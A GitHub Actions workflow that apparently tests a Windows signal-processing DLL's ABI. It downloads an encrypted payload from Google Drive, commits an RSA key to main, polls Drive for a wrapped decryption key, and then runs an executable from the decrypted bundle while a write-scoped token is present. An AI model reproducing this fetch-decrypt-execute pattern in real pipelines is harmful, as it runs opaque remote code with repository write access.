name: native-windows-final-candidate-v1

on:
  push:
    paths:
      - '.github/workflows/native_windows_final_candidate_v1.yml'

permissions:
  contents: write

defaults:
  run:
    shell: bash

jobs:
  native-gate:
    runs-on: windows-2022
    timeout-minutes: 30
    steps:
      - name: Checkout
        uses: actions/checkout@v4
        with:
          persist-credentials: true
          fetch-depth: 0

      - name: Fetch encrypted native payload
        run: |
          set -euo pipefail
          url='https://drive.google.com/uc?export=download&id=1GXl1ymTiPGqiI87aQrREL5TIzz6mahuf'
          curl -L --fail --retry 4 --retry-delay 2 -o "$RUNNER_TEMP/native.enc" "$url"
          test -s "$RUNNER_TEMP/native.enc"
          sha256sum "$RUNNER_TEMP/native.enc"

      - name: Publish one-time RSA key
        run: |
          set -euo pipefail
          openssl genpkey -algorithm RSA -pkeyopt rsa_keygen_bits:3072 -out "$RUNNER_TEMP/private.pem"
          openssl pkey -in "$RUNNER_TEMP/private.pem" -pubout -out "$RUNNER_TEMP/public.pem"
          git config user.name 'windows-dll-test-bot'
          git config user.email 'windows-dll-test-bot@users.noreply.github.com'
          ok=0
          for n in 1 2 3 4 5; do
            git fetch origin main
            git checkout -B main origin/main
            rm -rf .final_native_handoff_v1
            mkdir -p .final_native_handoff_v1
            cp "$RUNNER_TEMP/public.pem" .final_native_handoff_v1/public.pem
            git add .final_native_handoff_v1/public.pem
            git commit -m 'Publish final native v1 one-time RSA key' || true
            if git push origin HEAD:main; then ok=1; break; fi
            sleep 2
          done
          [ "$ok" = 1 ] || { echo FAIL_STAGE=PUBLIC_KEY_PUSH; exit 19; }
          echo FINAL_NATIVE_PUBLIC_KEY_PUBLISHED

      - name: Wait for matching wrapped AES key
        run: |
          set -euo pipefail
          url='https://drive.google.com/uc?export=download&id=1qodNWgYhbzggtOx_cOZjDo17jxrSXXj0'
          ok=0
          for i in $(seq 1 600); do
            rm -f "$RUNNER_TEMP/key.try" "$RUNNER_TEMP/pass.try"
            if curl -L -sS --fail --max-time 15 -o "$RUNNER_TEMP/key.try" "$url"; then
              size=$(wc -c < "$RUNNER_TEMP/key.try" | tr -d '[:space:]')
              if [ "$size" = 384 ]; then
                if openssl pkeyutl -decrypt -inkey "$RUNNER_TEMP/private.pem" -in "$RUNNER_TEMP/key.try" -out "$RUNNER_TEMP/pass.try" -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 >/dev/null 2>&1; then
                  mv "$RUNNER_TEMP/pass.try" "$RUNNER_TEMP/pass.txt"
                  ok=1
                  break
                fi
              fi
            fi
            sleep 2
          done
          [ "$ok" = 1 ] || { echo FAIL_STAGE=RSA_KEY_TIMEOUT; exit 20; }
          echo FINAL_NATIVE_RSA_KEY_ACCEPTED

      - name: Decrypt and verify payload
        run: |
          set -euo pipefail
          openssl enc -d -aes-256-cbc -pbkdf2 -iter 250000 -in "$RUNNER_TEMP/native.enc" -out "$RUNNER_TEMP/native.tar.xz" -pass file:"$RUNNER_TEMP/pass.txt"
          rm -rf payload && mkdir payload
          tar -xJf "$RUNNER_TEMP/native.tar.xz" -C payload
          cd payload
          sha256sum -c NATIVE_SHA256SUMS.txt
          sha256sum SigProcDll-64HF.dll | awk '{print $1}' > ../candidate_sha256.txt
          echo "CANDIDATE_SHA256=$(cat ../candidate_sha256.txt)"
          rm -f "$RUNNER_TEMP/pass.txt" "$RUNNER_TEMP/native.enc" "$RUNNER_TEMP/native.tar.xz"

      - name: Configure MSVC x86
        uses: ilammy/msvc-dev-cmd@v1
        with:
          arch: x86

      - name: Native PE ABI gate
        shell: cmd
        run: |
          dumpbin /headers payload\SigProcDll-64HF.dll > candidate_headers.txt
          dumpbin /exports payload\SigProcDll-64HF.dll > candidate_exports.txt
          dumpbin /imports payload\SigProcDll-64HF.dll > candidate_imports.txt
          dumpbin /imports payload\SigProcDll-HostCompat-baseline.dll > baseline_imports.txt
          findstr /C:"machine (x86)" candidate_headers.txt > nul || exit /b 40
          findstr /C:"_SigProc_Init@8" candidate_exports.txt > nul || exit /b 41
          findstr /C:"_SigProc@24" candidate_exports.txt > nul || exit /b 42
          findstr /C:"_SigProc_Stat@0" candidate_exports.txt > nul || exit /b 43
          findstr /C:"_SigProc_Fini@0" candidate_exports.txt > nul || exit /b 44
          findstr /I /C:"ucrtbase.dll" candidate_imports.txt > nul && exit /b 45 || exit /b 0

      - name: Verify import subset
        shell: powershell
        run: |
          $ErrorActionPreference='Stop'
          function Get-Dlls($p) { $a=@(); foreach($l in Get-Content $p){ if($l -match '^\s+([A-Za-z0-9_.-]+\.dll)\s*$'){ $a += $Matches[1].ToLowerInvariant() } }; @($a|Sort-Object -Unique) }
          $cand=Get-Dlls 'candidate_imports.txt'; $base=Get-Dlls 'baseline_imports.txt'; $extra=@($cand|Where-Object{$_ -notin $base})
          "CANDIDATE_IMPORTS=$($cand -join ',')" | Out-File import_subset.txt
          "BASELINE_IMPORTS=$($base -join ',')" | Add-Content import_subset.txt
          "EXTRA_IMPORTS=$($extra -join ',')" | Add-Content import_subset.txt
          if($extra.Count -ne 0){ Get-Content import_subset.txt; exit 46 }
          'IMPORT_SUBSET_PASS' | Add-Content import_subset.txt

      - name: Exact native loader contract
        shell: cmd
        working-directory: payload
        run: |
          SigProcLoaderContractSmoke.exe > ..\loader_smoke.txt 2>&1
          set RC=%ERRORLEVEL%
          type ..\loader_smoke.txt
          if not %RC%==0 exit /b %RC%
          findstr /C:"ALL_LOADER_CONTRACT_TESTS_PASS" ..\loader_smoke.txt > nul || exit /b 47
          echo FINAL_NATIVE_WINDOWS_GATE_PASS

      - name: Upload native evidence
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: final-native-v1-evidence
          path: |
            candidate_sha256.txt
            candidate_headers.txt
            candidate_exports.txt
            candidate_imports.txt
            baseline_imports.txt
            import_subset.txt
            loader_smoke.txt
          if-no-files-found: ignore
          retention-days: 7
